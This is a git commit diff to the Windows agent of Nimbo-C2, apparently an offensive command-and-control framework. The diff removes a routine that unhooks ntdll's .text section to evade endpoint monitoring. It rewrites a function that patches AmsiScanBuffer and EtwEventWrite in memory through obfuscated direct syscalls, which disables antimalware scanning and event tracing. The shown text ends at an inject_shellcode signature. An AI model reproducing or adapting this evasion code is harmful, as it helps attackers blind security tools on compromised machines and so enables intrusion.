0ea124cea517691fd6e8be0e8b9d572eef246de5
Itay Migdal <itaymigdal9@gmail.com>
2023-08-10 21:58:24 +0300

    improved patch_func and removed unhook_ntdll from agent code

--- Nimbo-C2/agent/windows/utils/memops.nim
+++ Nimbo-C2/agent/windows/utils/memops.nim
@@ -1,82 +1,79 @@
-import helpers
 import priv
 import winim
 import dynlib
-import strutils
 import nimprotect
-
-proc unhook_ntdll*(): bool =
-
-  var is_success = false
-  
-  let low: uint16 = 0
-  var 
-      processH = GetCurrentProcess()
-      mi : MODULEINFO
-      ntdllModule = GetModuleHandleA(protectString("ntdll.dll"))
-      ntdllBase : LPVOID
-      ntdllFile : FileHandle
-      ntdllMapping : HANDLE
-      ntdllMappingAddress : LPVOID
-      hookedDosHeader : PIMAGE_DOS_HEADER
-      hookedNtHeader : PIMAGE_NT_HEADERS
-      hookedSectionHeader : PIMAGE_SECTION_HEADER
-
-  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
-  ntdllBase = mi.lpBaseOfDll
-  ntdllFile = getOsFileHandle(open(protectString("C:\\windows\\system32\\ntdll.dll"),fmRead))
-  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL)
-  if ntdllMapping != 0:
-    ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
-    if not ntdllMappingAddress.isNil:
-        hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
-        hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
-        for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
-            hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
-            if ".text" in to_string(hookedSectionHeader.Name):
-                var oldProtection : DWORD = 0
-                if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) != 0:
-                    copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
-                    if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) != 0:
-                        is_success = true
-    CloseHandle(processH)
-    CloseHandle(ntdllFile)
-    CloseHandle(ntdllMapping)
-    FreeLibrary(ntdllModule)
-
-    return is_success
+include incl/syscalls3
 
 
 proc patch_func*(command_name: string): bool =
     
-    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
     var    
-        is_success = false
         dll_name: string
         func_name: string
+        func_addr: PVOID
+        func_addr2: PVOID
+        patch: seq[byte]
+        process_h: HANDLE
         dll_h: LibHandle
-        to_patch: pointer
-        op: DWORD
-        t: DWORD
+        old_protection: ULONG
+        bytes_written: SIZE_T
+        nt_status: NTSTATUS = 0
 
+    # specific function to patch case
     case command_name:
         of protectString("etw"):
             dll_name = protectString("ntdll")
             func_name = protectString("EtwEventWrite")
+            patch = @[byte 0xC3]  # ret
         of protectString("amsi"):
             dll_name = protectString("amsi")
             func_name = protectString("AmsiScanBuffer")
+            patch = @[byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3] # mov eax, 0x80070057 (E_INVALIDARG) ; ret
 
+    # Some handles and addresses retieval
+    var patch_len = cast[SIZE_T](patch.len)
+    process_h = GetCurrentProcess()
     dll_h = loadLib(dll_name)
-    if not isNil(dll_h):
-        to_patch = dll_h.symAddr(func_name)
-        if not isNil(to_patch):
-            if VirtualProtect(to_patch, patch.len, 0x40, addr op):
-                copyMem(to_patch, unsafeAddr patch, patch.len)
-                VirtualProtect(to_patch, patch.len, op, addr t)
-                is_success = true
+    if isNil(dll_h):
+        return false
+    func_addr = dll_h.symAddr(func_name)
+    if isNil(func_addr):
+        return false
 
-    return is_success
+    # NtProtectVirtualMemory gonna change func_addr so save it
+    func_addr2 = func_addr
+
+    nt_status = eGHtTmjXcbZTDDUi(  # NtProtectVirtualMemory
+        process_h, 
+        addr func_addr, 
+        addr patch_len, 
+        PAGE_EXECUTE_READWRITE, 
+        addr old_protection
+        )  
+    if nt_status != STATUS_SUCCESS:
+        return false
+
+    nt_status = OMQoAnSSJGeTcUxq(  # NtWriteVirtualMemory
+        process_h,
+        func_addr2,
+        addr patch[0],
+        cast[SIZE_T](patch.len),
+        addr bytes_written
+    )
+    if nt_status != ERROR_SUCCESS:
+        return false
+    
+    nt_status = eGHtTmjXcbZTDDUi(  # NtProtectVirtualMemory
+        process_h, 
+        addr func_addr, 
+        addr patch_len,
+        PAGE_EXECUTE_READ, 
+        addr old_protection
+        ) 
+    if nt_status != ERROR_SUCCESS:
+        return false
+    
+    return true
 
 
 proc inject_shellcode*(shellc: seq[byte], pid: int): bool = 
